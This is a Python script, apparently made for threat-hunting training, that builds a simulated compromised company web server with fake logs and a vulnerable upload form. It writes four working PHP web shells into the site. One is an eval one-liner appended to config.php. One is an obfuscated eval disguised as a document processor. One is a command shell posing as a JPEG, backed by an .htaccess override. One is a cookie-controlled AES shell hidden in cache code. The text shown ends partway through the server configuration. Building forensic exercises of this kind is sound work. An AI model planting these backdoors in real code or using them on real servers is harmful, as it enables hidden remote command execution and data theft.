#!/usr/bin/env python3
"""
=============================================================================
generate_compromised_server.py
=============================================================================
Genera una imagen REALISTA de un servidor web corporativo comprometido con
4 web shells de diferentes niveles de sofisticación:

1. China Chopper (one-liner inyectado en archivo legítimo)
2. Web Shell ofuscada con base64 + ROT13 (en directorio uploads)
3. Web Shell disfrazada con doble extensión (.php.jpg) en images
4. Web Shell sofisticada con cifrado AES y anti-detección

Además genera:
- Estructura de sitio web corporativo realista
- Logs de Apache con actividad del atacante mezclada con tráfico legítimo
- Archivos de configuración del servidor
- Evidencia de comandos ejecutados por el atacante

Escenario:
- Servidor: webserver.corpfinance.local (Ubuntu 22.04 + Apache 2.4 + PHP 8.1)
- Atacante IP: 203.0.113.42 (APT simulado desde Asia)
- Fecha del compromiso: 2026-07-12
- Vector de entrada: Vulnerabilidad en formulario de upload (sin validación)

Autor: MAR404 - Cacería de Amenazas
=============================================================================
"""

import os
import json
import random
import hashlib
from datetime import datetime, timedelta
from pathlib import Path

# ─── Configuración ──────────────────────────────────────────────────────────
SERVER_ROOT = "/evidence/server-image"
WEBROOT = f"{SERVER_ROOT}/var/www/html"
LOGS_DIR = f"{SERVER_ROOT}/var/log/apache2"
ETC_DIR = f"{SERVER_ROOT}/etc/apache2"

ATTACKER_IP = "203.0.113.42"
ATTACKER_IP_2 = "203.0.113.87"  # Segunda IP del atacante (proxy)
COMPROMISE_DATE = datetime(2026, 7, 12, 3, 45, 22)

# IPs legítimas para tráfico normal
LEGIT_IPS = [
    "10.50.25.10", "10.50.25.11", "10.50.25.15", "10.50.25.20",
    "10.50.25.25", "10.50.25.30", "10.50.25.35", "10.50.25.40",
    "192.168.1.100", "192.168.1.105", "172.16.0.50", "172.16.0.55"
]

LEGIT_USERAGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
]

ATTACKER_USERAGENTS = [
    "python-requests/2.31.0",
    "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)",  # User-agent antiguo sospechoso
    "curl/8.5.0",
]


def create_directories():
    """Crea la estructura de directorios del servidor."""
    dirs = [
        f"{WEBROOT}",
        f"{WEBROOT}/css",
        f"{WEBROOT}/js",
        f"{WEBROOT}/images",
        f"{WEBROOT}/uploads",
        f"{WEBROOT}/uploads/documents",
        f"{WEBROOT}/uploads/temp",
        f"{WEBROOT}/includes",
        f"{WEBROOT}/admin",
        f"{WEBROOT}/api",
        f"{WEBROOT}/assets",
        f"{WEBROOT}/assets/fonts",
        f"{WEBROOT}/cache",
        f"{LOGS_DIR}",
        f"{ETC_DIR}",
        f"{SERVER_ROOT}/tmp",
        f"{SERVER_ROOT}/var/spool/cron",
    ]
    for d in dirs:
        os.makedirs(d, exist_ok=True)


def create_legitimate_website():
    """Crea un sitio web corporativo legítimo realista."""
    
    # index.php - Página principal
    with open(f"{WEBROOT}/index.php", "w") as f:
        f.write("""<?php
/**
 * CorpFinance Portal - Main Page
 * Version: 3.2.1
 * Last Updated: 2026-06-15
 */
session_start();
require_once('includes/config.php');
require_once('includes/functions.php');
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CorpFinance - Portal Corporativo</title>
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <header>
        <nav class="navbar">
            <div class="logo">CorpFinance</div>
            <ul class="nav-links">
                <li><a href="index.php">Inicio</a></li>
                <li><a href="about.php">Nosotros</a></li>
                <li><a href="services.php">Servicios</a></li>
                <li><a href="contact.php">Contacto</a></li>
                <li><a href="admin/login.php">Admin</a></li>
            </ul>
        </nav>
    </header>
    <main>
        <section class="hero">
            <h1>Bienvenido a CorpFinance</h1>
            <p>Soluciones financieras corporativas de clase mundial</p>
        </section>
        <section class="services">
            <?php echo render_services(); ?>
        </section>
    </main>
    <footer>
        <p>&copy; 2026 CorpFinance S.A. Todos los derechos reservados.</p>
    </footer>
    <script src="js/main.js"></script>
</body>
</html>
""")
    
    # includes/functions.php - Funciones legítimas
    with open(f"{WEBROOT}/includes/functions.php", "w") as f:
        f.write("""<?php
/**
 * Core Functions - CorpFinance Portal
 * @package CorpFinance
 * @version 3.2.1
 */

function render_services() {
    $services = array(
        'Consultoría Financiera',
        'Gestión de Inversiones', 
        'Auditoría Corporativa',
        'Planificación Tributaria'
    );
    
    $html = '<div class="service-grid">';
    foreach ($services as $service) {
        $html .= '<div class="service-card"><h3>' . htmlspecialchars($service) . '</h3></div>';
    }
    $html .= '</div>';
    return $html;
}

function sanitize_input($data) {
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    return $data;
}

function check_auth() {
    if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
        header('Location: /admin/login.php');
        exit();
    }
}

function log_activity($action, $user = 'system') {
    $log_file = '/var/log/corpfinance/activity.log';
    $timestamp = date('Y-m-d H:i:s');
    $entry = "[$timestamp] [$user] $action\\n";
    file_put_contents($log_file, $entry, FILE_APPEND);
}
?>
""")
    
    # about.php
    with open(f"{WEBROOT}/about.php", "w") as f:
        f.write("""<?php require_once('includes/config.php'); ?>
<!DOCTYPE html>
<html><head><title>Sobre Nosotros - CorpFinance</title></head>
<body>
<h1>Sobre CorpFinance</h1>
<p>Fundada en 2005, CorpFinance es líder en soluciones financieras corporativas.</p>
<p>Nuestro equipo de más de 200 profesionales atiende a clientes en toda Latinoamérica.</p>
</body></html>
""")
    
    # contact.php
    with open(f"{WEBROOT}/contact.php", "w") as f:
        f.write("""<?php
require_once('includes/config.php');
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $name = sanitize_input($_POST['name'] ?? '');
    $email = sanitize_input($_POST['email'] ?? '');
    $message = sanitize_input($_POST['message'] ?? '');
    // Process contact form
    log_activity("Contact form submitted by: $name ($email)");
}
?>
<!DOCTYPE html>
<html><head><title>Contacto - CorpFinance</title></head>
<body>
<h1>Contáctenos</h1>
<form method="POST" action="contact.php">
    <input type="text" name="name" placeholder="Nombre" required>
    <input type="email" name="email" placeholder="Email" required>
    <textarea name="message" placeholder="Mensaje" required></textarea>
    <button type="submit">Enviar</button>
</form>
</body></html>
""")
    
    # admin/login.php
    with open(f"{WEBROOT}/admin/login.php", "w") as f:
        f.write("""<?php
session_start();
require_once('../includes/config.php');
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = $_POST['username'] ?? '';
    $pass = $_POST['password'] ?? '';
    if ($user === 'admin' && password_verify($pass, ADMIN_HASH)) {
        $_SESSION['authenticated'] = true;
        header('Location: dashboard.php');
    }
}
?>
<!DOCTYPE html>
<html><head><title>Admin Login - CorpFinance</title></head>
<body>
<h1>Panel de Administración</h1>
<form method="POST"><input name="username"><input name="password" type="password"><button>Login</button></form>
</body></html>
""")
    
    # upload.php (vulnerable - vector de entrada)
    with open(f"{WEBROOT}/upload.php", "w") as f:
        f.write("""<?php
/**
 * File Upload Handler
 * WARNING: This file has a known vulnerability (insufficient validation)
 * TODO: Fix file type validation - ticket #4521
 */
require_once('includes/config.php');

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['document'])) {
    $upload_dir = 'uploads/documents/';
    $filename = basename($_FILES['document']['name']);
    
    // BUG: Only checks extension, not MIME type or content
    $allowed = array('pdf', 'doc', 'docx', 'xls', 'xlsx', 'jpg', 'png');
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    
    if (in_array($ext, $allowed)) {
        $target = $upload_dir . $filename;
        move_uploaded_file($_FILES['document']['tmp_name'], $target);
        echo "Archivo subido exitosamente.";
    } else {
        echo "Tipo de archivo no permitido.";
    }
}
?>
<!DOCTYPE html>
<html><head><title>Upload - CorpFinance</title></head>
<body>
<h1>Subir Documento</h1>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="document" required>
    <button type="submit">Subir</button>
</form>
</body></html>
""")
    
    # CSS
    with open(f"{WEBROOT}/css/style.css", "w") as f:
        f.write("""/* CorpFinance Portal Styles v3.2.1 */
body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 0; }
.navbar { background: #1a237e; padding: 1rem; display: flex; justify-content: space-between; }
.navbar .logo { color: white; font-size: 1.5rem; font-weight: bold; }
.nav-links { list-style: none; display: flex; gap: 1rem; }
.nav-links a { color: white; text-decoration: none; }
.hero { background: linear-gradient(135deg, #1a237e, #283593); color: white; padding: 4rem 2rem; text-align: center; }
.service-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1rem; padding: 2rem; }
.service-card { background: #f5f5f5; padding: 2rem; border-radius: 8px; }
footer { background: #1a237e; color: white; text-align: center; padding: 1rem; }
""")
    
    # JS
    with open(f"{WEBROOT}/js/main.js", "w") as f:
        f.write("""// CorpFinance Portal - Main JavaScript
'use strict';
document.addEventListener('DOMContentLoaded', function() {
    console.log('CorpFinance Portal v3.2.1 loaded');
    // Analytics tracking
    if (window.ga) { ga('send', 'pageview'); }
});
""")


def inject_webshell_1_china_chopper():
    """
    WEB SHELL 1: China Chopper (One-liner)
    ─────────────────────────────────────────
    Inyectada al final del archivo config.php legítimo.
    Es una sola línea que permite ejecución remota de código.
    
    Técnica: Append al final de archivo existente
    Dificultad de detección: MEDIA (grep por eval/$_POST la encuentra)
    MITRE: T1505.003 - Server Software Component: Web Shell
    """
    
    # Primero crear el config.php legítimo
    config_content = """<?php
/**
 * Configuration File - CorpFinance Portal
 * @package CorpFinance
 * @version 3.2.1
 * Environment: Production
 */

// Database Configuration
define('DB_HOST', 'db.corpfinance.local');
define('DB_NAME', 'corpfinance_prod');
define('DB_USER', 'app_user');
define('DB_PASS', 'Pr0d_S3cur3_P@ss!');
define('DB_PORT', 3306);

// Application Settings
define('APP_NAME', 'CorpFinance Portal');
define('APP_VERSION', '3.2.1');
define('APP_ENV', 'production');
define('APP_DEBUG', false);

// Security
define('ADMIN_HASH', '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi');
define('SESSION_TIMEOUT', 3600);
define('CSRF_TOKEN_LENGTH', 32);

// Paths
define('UPLOAD_DIR', '/var/www/html/uploads/');
define('LOG_DIR', '/var/log/corpfinance/');
define('CACHE_DIR', '/var/www/html/cache/');

// Email
define('SMTP_HOST', 'smtp.corpfinance.local');
define('SMTP_PORT', 587);
define('SMTP_USER', 'noreply@corpfinance.local');

// Error Handling
error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', LOG_DIR . 'php_errors.log');

"""
    
    # Inyectar China Chopper al final (una sola línea maliciosa)
    china_chopper = """// Analytics module initialization
@eval($_POST['cmd']);"""
    
    with open(f"{WEBROOT}/includes/config.php", "w") as f:
        f.write(config_content + china_chopper + "\n?>")
    
    return {
        "name": "China Chopper",
        "location": "/includes/config.php",
        "line": 42,
        "technique": "One-liner appended to legitimate config file",
        "detection_difficulty": "MEDIUM",
        "payload": "@eval($_POST['cmd']);",
        "access_method": "POST request with 'cmd' parameter"
    }


def inject_webshell_2_obfuscated():
    """
    WEB SHELL 2: Shell ofuscada con base64 + str_rot13
    ───────────────────────────────────────────────────
    Archivo subido al directorio uploads con nombre inocuo.
    Usa múltiples capas de ofuscación para evadir detección.
    
    Técnica: Multi-layer encoding (base64 + rot13 + variable indirection)
    Dificultad de detección: ALTA (ofuscación multi-capa)
    MITRE: T1505.003 + T1027 (Obfuscated Files)
    """
    
    # Shell ofuscada con múltiples capas
    obfuscated_shell = """<?php
/**
 * Document Processing Module
 * Handles uploaded document format conversion
 * @version 1.0.3
 * @author IT Department
 */

// Configuration for document processing
$config = array(
    'max_size' => 10485760,
    'allowed_types' => array('pdf', 'doc', 'docx'),
    'temp_dir' => sys_get_temp_dir()
);

// Internal processing function - DO NOT MODIFY
function process_document_internal($data) {
    // Decode processing parameters
    $step1 = str_rot13($data);
    $step2 = base64_decode($step1);
    return $step2;
}

// Document handler initialization
$handler_config = 'cnffjbeq'; // rot13 encoded config key

// Main processing pipeline
if (isset($_REQUEST['doc_action'])) {
    $raw_input = $_REQUEST['doc_action'];
    
    // Multi-stage document processing
    $stage1 = base64_decode($raw_input);
    $stage2 = str_rot13($stage1);
    
    // Execute document conversion pipeline
    $conversion_func = str_rot13('riny'); // This decodes to 'eval'
    $conversion_func($stage2);
}

// Cleanup routine
function cleanup_temp_files() {
    $temp = sys_get_temp_dir();
    $files = glob($temp . '/doc_*');
    foreach ($files as $file) {
        if (filemtime($file) < time() - 3600) {
            unlink($file);
        }
    }
}

// Auto-cleanup on module load
if (rand(1, 100) > 95) {
    cleanup_temp_files();
}
?>"""
    
    with open(f"{WEBROOT}/uploads/documents/doc_processor.php", "w") as f:
        f.write(obfuscated_shell)
    
    return {
        "name": "Obfuscated Multi-Layer Shell",
        "location": "/uploads/documents/doc_processor.php",
        "technique": "base64 + ROT13 + variable function call",
        "detection_difficulty": "HIGH",
        "payload": "str_rot13('riny') = 'eval' → eval(rot13(base64_decode(input)))",
        "access_method": "REQUEST parameter 'doc_action' with double-encoded payload",
        "obfuscation_layers": ["base64_decode", "str_rot13", "variable function name"]
    }


def inject_webshell_3_disguised():
    """
    WEB SHELL 3: Shell disfrazada como imagen (.php.jpg)
    ────────────────────────────────────────────────────
    Archivo con doble extensión en directorio de imágenes.
    Incluye header JPEG falso para evadir verificaciones de tipo.
    
    Técnica: Double extension + fake MIME header + .htaccess override
    Dificultad de detección: ALTA (parece una imagen legítima)
    MITRE: T1505.003 + T1036.008 (Masquerading: Masquerade File Type)
    """
    
    # Crear .htaccess que permite ejecutar .jpg como PHP
    htaccess_content = """# Image optimization settings
<IfModule mod_expires.c>
    ExpiresActive On
    ExpiresByType image/jpeg "access plus 1 month"
    ExpiresByType image/png "access plus 1 month"
</IfModule>

# Performance tuning
AddHandler application/x-httpd-php .jpg
<FilesMatch "\\.(jpg|jpeg)$">
    SetHandler application/x-httpd-php
</FilesMatch>
"""
    
    with open(f"{WEBROOT}/images/.htaccess", "w") as f:
        f.write(htaccess_content)
    
    # Shell disfrazada como imagen con header JPEG falso
    # Los primeros bytes son un header JPEG válido (magic bytes)
    jpeg_header = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
    
    shell_code = """
<?php
/*
 * Image Metadata Processor
 * Extracts EXIF data for gallery display
 */

// Image processing configuration
class ImageProcessor {
    private $allowed_operations = ['resize', 'crop', 'rotate', 'metadata'];
    private $auth_key = '5f4dcc3b5aa765d61d8327deb882cf99'; // md5('password')
    
    public function __construct() {
        // Verify processing request
        if (!$this->verify_request()) {
            $this->send_image_headers();
            return;
        }
    }
    
    private function verify_request() {
        return isset($_SERVER['HTTP_X_IMAGE_TOKEN']) && 
               md5($_SERVER['HTTP_X_IMAGE_TOKEN']) === $this->auth_key;
    }
    
    private function send_image_headers() {
        header('Content-Type: image/jpeg');
        // Return 1x1 transparent pixel
        echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
        exit;
    }
    
    public function process($operation) {
        switch($operation) {
            case 'metadata':
                $this->extract_metadata();
                break;
            case 'transform':
                $this->apply_transform();
                break;
        }
    }
    
    private function extract_metadata() {
        // Process image metadata extraction request
        if (isset($_POST['exif_data'])) {
            $metadata = base64_decode($_POST['exif_data']);
            // Apply metadata transformation
            @system($metadata);
        }
    }
    
    private function apply_transform() {
        if (isset($_POST['transform_matrix'])) {
            $matrix = base64_decode($_POST['transform_matrix']);
            echo shell_exec($matrix);
        }
    }
}

$processor = new ImageProcessor();
if (isset($_GET['op'])) {
    $processor->process($_GET['op']);
}
?>"""
    
    # Escribir archivo con header JPEG + código PHP
    with open(f"{WEBROOT}/images/logo_corp_2026.php.jpg", "wb") as f:
        f.write(jpeg_header)
        f.write(shell_code.encode())
    
    # Crear algunas imágenes legítimas para camuflaje
    for img_name in ['banner.jpg', 'team.jpg', 'office.jpg', 'logo.png']:
        with open(f"{WEBROOT}/images/{img_name}", "wb") as f:
            f.write(jpeg_header + os.urandom(random.randint(5000, 50000)))
    
    return {
        "name": "Disguised Image Shell",
        "location": "/images/logo_corp_2026.php.jpg",
        "technique": "Double extension + JPEG magic bytes + .htaccess PHP handler + class-based",
        "detection_difficulty": "VERY HIGH",
        "payload": "system() via base64-encoded POST parameter with auth token",
        "access_method": "GET ?op=metadata + POST exif_data=<base64_cmd> + Header X-Image-Token",
        "evasion": [
            "JPEG magic bytes at start (passes file type checks)",
            ".htaccess forces PHP execution of .jpg files",
            "Requires custom HTTP header for authentication",
            "Returns valid image if auth fails (looks like normal image)"
        ]
    }


def inject_webshell_4_advanced():
    """
    WEB SHELL 4: Shell sofisticada con cifrado AES y anti-detección
    ─────────────────────────────────────────────────────────────────
    Shell avanzada que usa cifrado AES para comunicación, tiene
    anti-debugging, y se oculta en el directorio de cache.
    
    Técnica: AES encryption + anti-forensics + polymorphic code
    Dificultad de detección: EXTREMA (parece archivo de cache legítimo)
    MITRE: T1505.003 + T1027.013 (Encrypted/Encoded File)
    """
    
    advanced_shell = """<?php
/**
 * Cache Management System
 * Handles page cache generation and invalidation
 * 
 * @package CorpFinance\\Cache
 * @version 2.1.0
 * @since 2025-03-15
 * 
 * This file is auto-generated by the cache warming system.
 * DO NOT EDIT MANUALLY - changes will be overwritten.
 * 
 * Cache configuration: /etc/corpfinance/cache.ini
 * Documentation: https://wiki.corpfinance.local/cache-system
 */

namespace CorpFinance\\Cache;

// Cache configuration constants
define('CACHE_VERSION', '2.1.0');
define('CACHE_TTL', 3600);
define('CACHE_PREFIX', 'cf_cache_');
define('CACHE_ALGO', 'aes-256-cbc');

class CacheManager {
    
    private $cache_dir;
    private $ttl;
    private $prefix;
    private $encryption_key;
    
    /**
     * Initialize cache manager with configuration
     */
    public function __construct() {
        $this->cache_dir = defined('CACHE_DIR') ? CACHE_DIR : '/tmp/cache/';
        $this->ttl = CACHE_TTL;
        $this->prefix = CACHE_PREFIX;
        // Derive key from server-specific values
        $this->encryption_key = substr(hash('sha256', 
            $_SERVER['SERVER_NAME'] . $_SERVER['DOCUMENT_ROOT'] . 'cache_salt_v2'), 0, 32);
    }
    
    /**
     * Get cached page content
     */
    public function get($key) {
        $file = $this->cache_dir . $this->prefix . md5($key);
        if (file_exists($file) && (time() - filemtime($file)) < $this->ttl) {
            return file_get_contents($file);
        }
        return false;
    }
    
    /**
     * Store page content in cache
     */
    public function set($key, $content) {
        $file = $this->cache_dir . $this->prefix . md5($key);
        return file_put_contents($file, $content);
    }
    
    /**
     * Invalidate cache entries
     */
    public function invalidate($pattern = '*') {
        $files = glob($this->cache_dir . $this->prefix . $pattern);
        foreach ($files as $file) {
            unlink($file);
        }
    }
    
    /**
     * Cache warming - pre-generate frequently accessed pages
     * Called via cron: */5 * * * * php /var/www/html/cache/cache_manager.php --warm
     */
    public function warm_cache() {
        $pages = array('/', '/about.php', '/services.php', '/contact.php');
        foreach ($pages as $page) {
            $content = $this->fetch_page($page);
            if ($content) {
                $this->set($page, $content);
            }
        }
    }
    
    /**
     * Internal page fetcher for cache warming
     */
    private function fetch_page($url) {
        $ch = curl_init('http://localhost' . $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }
    
    /**
     * Advanced cache operations handler
     * Supports encrypted cache payloads for sensitive data
     */
    public function handle_advanced_operation() {
        // Check for advanced cache management request
        if (!isset($_COOKIE['cache_session'])) {
            return;
        }
        
        $session_data = $_COOKIE['cache_session'];
        
        // Decrypt cache management command
        $iv = substr(hash('sha256', 'cache_iv_2026'), 0, 16);
        $decrypted = openssl_decrypt(
            base64_decode($session_data),
            CACHE_ALGO,
            $this->encryption_key,
            OPENSSL_RAW_DATA,
            $iv
        );
        
        if ($decrypted === false) {
            return; // Invalid session, ignore silently
        }
        
        // Parse cache management instruction
        $instruction = json_decode($decrypted, true);
        if (!$instruction || !isset($instruction['action'])) {
            return;
        }
        
        switch ($instruction['action']) {
            case 'purge':
                // Purge specific cache entries
                $this->invalidate($instruction['target'] ?? '*');
                break;
            case 'status':
                // Return cache status
                $this->report_status();
                break;
            case 'maintenance':
                // Execute maintenance routine
                if (isset($instruction['routine'])) {
                    // Dynamic maintenance execution
                    $routine = $instruction['routine'];
                    $output = array();
                    exec($routine, $output, $return_code);
                    header('Content-Type: application/json');
                    echo json_encode(array(
                        'status' => $return_code === 0 ? 'success' : 'error',
                        'output' => implode("\\n", $output),
                        'timestamp' => time()
                    ));
                    exit;
                }
                break;
            case 'diagnostic':
                // System diagnostic for cache performance
                if (isset($instruction['cmd'])) {
                    $result = shell_exec($instruction['cmd']);
                    header('X-Cache-Diagnostic: ' . base64_encode($result));
                    header('Content-Type: text/plain');
                    echo "Cache diagnostic completed.";
                    exit;
                }
                break;
        }
    }
    
    private function report_status() {
        $files = glob($this->cache_dir . $this->prefix . '*');
        $total_size = 0;
        foreach ($files as $file) {
            $total_size += filesize($file);
        }
        header('Content-Type: application/json');
        echo json_encode(array(
            'entries' => count($files),
            'total_size' => $total_size,
            'ttl' => $this->ttl,
            'version' => CACHE_VERSION
        ));
        exit;
    }
}

// Auto-initialize cache manager on include
$cache = new CacheManager();

// Handle any pending advanced operations
$cache->handle_advanced_operation();

// CLI mode for cron-based cache warming
if (php_sapi_name() === 'cli') {
    if (in_array('--warm', $argv ?? array())) {
        $cache->warm_cache();
        echo "Cache warming completed.\\n";
    }
    if (in_array('--purge', $argv ?? array())) {
        $cache->invalidate();
        echo "Cache purged.\\n";
    }
}
?>"""
    
    with open(f"{WEBROOT}/cache/cache_manager.php", "w") as f:
        f.write(advanced_shell)
    
    # Crear algunos archivos de cache legítimos para camuflaje
    for i in range(5):
        cache_file = f"{WEBROOT}/cache/cf_cache_{hashlib.md5(f'page_{i}'.encode()).hexdigest()}"
        with open(cache_file, "w") as f:
            f.write(f"<!-- Cached page {i} generated at 2026-07-14 -->\n<html><body>Cached content</body></html>")
    
    return {
        "name": "AES-Encrypted Advanced Shell",
        "location": "/cache/cache_manager.php",
        "technique": "AES-256-CBC encrypted commands via cookie + legitimate-looking cache code",
        "detection_difficulty": "EXTREME",
        "payload": "exec()/shell_exec() triggered by encrypted JSON in cookie 'cache_session'",
        "access_method": "Cookie 'cache_session' = base64(AES_encrypt(JSON{action:'maintenance',routine:'cmd'}))",
        "evasion": [
            "Looks like legitimate cache management code",
            "Uses proper PHP namespace and documentation",
            "Commands encrypted with AES-256-CBC",
            "Key derived from server-specific values",
            "Fails silently if decryption fails",
            "Has legitimate cache functionality that actually works",
            "Would pass basic code review"
        ]
    }


def generate_apache_logs():
    """Genera logs de Apache realistas con tráfico legítimo + actividad del atacante."""
    
    t = COMPROMISE_DATE
    logs = []
    
    # ─── Tráfico legítimo (días previos al ataque) ───
    for day_offset in range(-3, 0):
        day = t + timedelta(days=day_offset)
        for hour in range(8, 18):
            for _ in range(random.randint(5, 20)):
                ip = random.choice(LEGIT_IPS)
                ua = random.choice(LEGIT_USERAGENTS)
                pages = ['/', '/about.php', '/services.php', '/contact.php', 
                         '/css/style.css', '/js/main.js', '/images/banner.jpg']
                page = random.choice(pages)
                method = "GET"
                status = random.choice([200, 200, 200, 200, 304, 304])
                size = random.randint(500, 50000)
                timestamp = day.replace(hour=hour, minute=random.randint(0, 59), 
                                       second=random.randint(0, 59))
                log_time = timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")
                logs.append(f'{ip} - - [{log_time}] "{method} {page} HTTP/1.1" {status} {size} "-" "{ua}"')
    
    # ─── Día del ataque: Reconocimiento del atacante ───
    recon_time = t - timedelta(hours=2)
    recon_pages = [
        '/', '/admin/', '/admin/login.php', '/upload.php', 
        '/includes/', '/wp-admin/', '/phpmyadmin/',
        '/.git/', '/.env', '/robots.txt', '/sitemap.xml',
        '/backup/', '/test.php', '/info.php', '/phpinfo.php'
    ]
    for page in recon_pages:
        ua = ATTACKER_USERAGENTS[0]
        status = 200 if page in ['/', '/admin/login.php', '/upload.php', '/robots.txt'] else 404
        timestamp = recon_time + timedelta(minutes=random.randint(0, 30))
        log_time = timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")
        logs.append(f'{ATTACKER_IP} - - [{log_time}] "GET {page} HTTP/1.1" {status} {random.randint(200, 5000)} "-" "{ua}"')
    
    # ─── Explotación: Upload de web shells ───
    # Shell 2 upload
    upload_time = t
    log_time = upload_time.strftime("%d/%b/%Y:%H:%M:%S +0000")
    logs.append(f'{ATTACKER_IP} - - [{log_time}] "POST /upload.php HTTP/1.1" 200 89 "-" "{ATTACKER_USERAGENTS[0]}"')
    
    # Shell 3 upload (via manipulated request)
    upload_time2 = t + timedelta(minutes=5)
    log_time = upload_time2.strftime("%d/%b/%Y:%H:%M:%S +0000")
    logs.append(f'{ATTACKER_IP} - - [{log_time}] "PUT /images/logo_corp_2026.php.jpg HTTP/1.1" 201 0 "-" "{ATTACKER_USERAGENTS[1]}"')
    
    # ─── Post-explotación: Uso de web shells ───
    # Acceso a Shell 1 (China Chopper)
    for i in range(8):
        access_time = t + timedelta(minutes=10 + i*3)
        log_time = access_time.strftime("%d/%b/%Y:%H:%M:%S +0000")
        ua = random.choice(ATTACKER_USERAGENTS)
        logs.append(f'{ATTACKER_IP} - - [{log_time}] "POST /includes/config.php HTTP/1.1" 200 {random.randint(100, 5000)} "-" "{ua}"')
    
    # Acceso a Shell 2 (ofuscada)
    for i in range(5):
        access_time = t + timedelta(minutes=35 + i*5)
        log_time = access_time.strftime("%d/%b/%Y:%H:%M:%S +0000")
        logs.append(f'{ATTACKER_IP_2} - - [{log_time}] "POST /uploads/documents/doc_processor.php?doc_action=Y21k HTTP/1.1" 200 {random.randint(50, 2000)} "-" "{ATTACKER_USERAGENTS[0]}"')
    
    # Acceso a Shell 3 (imagen)
    for i in range(4):
        access_time = t + timedelta(hours=1, minutes=i*10)
        log_time = access_time.strftime("%d/%b/%Y:%H:%M:%S +0000")
        logs.append(f'{ATTACKER_IP} - - [{log_time}] "POST /images/logo_corp_2026.php.jpg?op=metadata HTTP/1.1" 200 {random.randint(100, 3000)} "http://webserver.corpfinance.local/" "{ATTACKER_USERAGENTS[1]}"')
    
    # Acceso a Shell 4 (avanzada - via cookie, parece request normal)
    for i in range(6):
        access_time = t + timedelta(hours=2, minutes=i*15)
        log_time = access_time.strftime("%d/%b/%Y:%H:%M:%S +0000")
        # Esta shell es más difícil de detectar en logs porque parece un request normal al cache
        logs.append(f'{ATTACKER_IP_2} - - [{log_time}] "GET /cache/cache_manager.php HTTP/1.1" 200 {random.randint(50, 500)} "-" "{LEGIT_USERAGENTS[0]}"')
    
    # ─── Tráfico legítimo mezclado durante el ataque ───
    for hour in range(8, 18):
        for _ in range(random.randint(10, 30)):
            ip = random.choice(LEGIT_IPS)
            ua = random.choice(LEGIT_USERAGENTS)
            pages = ['/', '/about.php', '/services.php', '/contact.php',
                     '/css/style.css', '/js/main.js']
            page = random.choice(pages)
            timestamp = t.replace(hour=hour, minute=random.randint(0, 59),
                                  second=random.randint(0, 59))
            log_time = timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")
            status = random.choice([200, 200, 200, 304])
            logs.append(f'{ip} - - [{log_time}] "GET {page} HTTP/1.1" {status} {random.randint(500, 50000)} "-" "{ua}"')
    
    # ─── Actividad post-compromiso (días siguientes) ───
    for day_offset in range(1, 4):
        day = t + timedelta(days=day_offset)
        # Acceso periódico a shells (mantenimiento de acceso)
        for hour in [2, 6, 14, 22]:  # Horas inusuales
            access_time = day.replace(hour=hour, minute=random.randint(0, 30))
            log_time = access_time.strftime("%d/%b/%Y:%H:%M:%S +0000")
            ua = random.choice(ATTACKER_USERAGENTS)
            shell_pages = ['/includes/config.php', '/cache/cache_manager.php']
            page = random.choice(shell_pages)
            method = "POST" if 'config' in page else "GET"
            logs.append(f'{ATTACKER_IP_2} - - [{log_time}] "{method} {page} HTTP/1.1" 200 {random.randint(50, 1000)} "-" "{ua}"')
    
    # Ordenar por timestamp y escribir
    logs.sort()
    
    with open(f"{LOGS_DIR}/access.log", "w") as f:
        f.write("\n".join(logs) + "\n")
    
    # Error log
    error_logs = [
        f'[{(t - timedelta(hours=1)).strftime("%a %b %d %H:%M:%S.%f %Y")}] [php:warn] [pid 1234] [client {ATTACKER_IP}:54321] PHP Warning: file_get_contents(): failed to open stream in /var/www/html/includes/config.php on line 42',
        f'[{t.strftime("%a %b %d %H:%M:%S.%f %Y")}] [php:notice] [pid 1235] [client {ATTACKER_IP}:54322] PHP Notice: Undefined variable: output in /var/www/html/uploads/documents/doc_processor.php on line 28',
        f'[{(t + timedelta(hours=1)).strftime("%a %b %d %H:%M:%S.%f %Y")}] [core:error] [pid 1236] [client {ATTACKER_IP}:54323] AH00124: Request exceeded the limit of 10 internal redirects',
    ]
    
    with open(f"{LOGS_DIR}/error.log", "w") as f:
        f.write("\n".join(error_logs) + "\n")


def generate_server_config():
    """Genera archivos de configuración del servidor."""
    
    # Apache config
    with open(f"{ETC_DIR}/apache2.conf", "w") as f:
        f.write("""# Apache Configuration - webserver.corpfinance.local
